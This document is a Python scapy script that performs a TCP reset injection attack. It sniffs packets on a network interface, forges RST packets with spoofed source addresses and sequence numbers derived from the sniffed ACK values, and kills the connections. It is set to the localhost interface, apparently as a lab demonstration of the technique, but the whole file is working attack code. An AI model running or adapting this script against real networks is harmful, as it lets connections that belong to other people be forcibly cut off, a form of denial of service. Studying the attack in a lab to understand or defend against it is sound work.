from scapy.all import *
import ifaddr
import random

DEFAULT_WINDOW_SIZE = 2052

conf.L3socket = L3RawSocket

def log(msg, params={}):
    formatted_params = " ".join([f"{k}={v}" for k, v in params.items()])
    print(f"{msg} {formatted_params}")

def send_reset(iface, seq_jitter=0, ignore_syn=True):
    def f(p):
        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        log(
            "Sniffed packet",
            {
                "Source IP": src_ip,
                "Destination IP": dst_ip,
                "Source Port": src_port,
                "Destination Port": dst_port,
                "Sequence number": seq,
                "ACK": ack,
            }
        )

        if "S" in flags and ignore_syn:
            print("Packet has SYN flag, not sending RST")
            return

        # Don't allow a -ve seq
        jitter = random.randint(max(-seq_jitter, -seq), seq_jitter)
        if jitter == 0:
            print("jitter is 0, this RST packet should close the connection")

        rst_seq = ack + jitter
        p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)

        log(
            "Sending RST packet",
            {
                "Original ACK": ack,
                "Jitter": jitter,
                "Sequence number": rst_seq,    
            },
        )

        send(p, verbose=0, iface=iface)

    return f

if __name__ == "__main__":
    localhost_ip = "127.0.0.1"
    local_interfaces = [
        adapter.name for adapter in ifaddr.get_adapters()
        if len([ip for ip in adapter.ips if ip.ip == localhost_ip]) > 0
    ]

    iface = local_interfaces[0]

    localhost_server_port = 9000

    t = sniff(
        iface=iface,
        count=50,
        prn=send_reset(iface)
        # prn=lambda p: p.show()
    )
    wrpcap("temp2.cap", t)
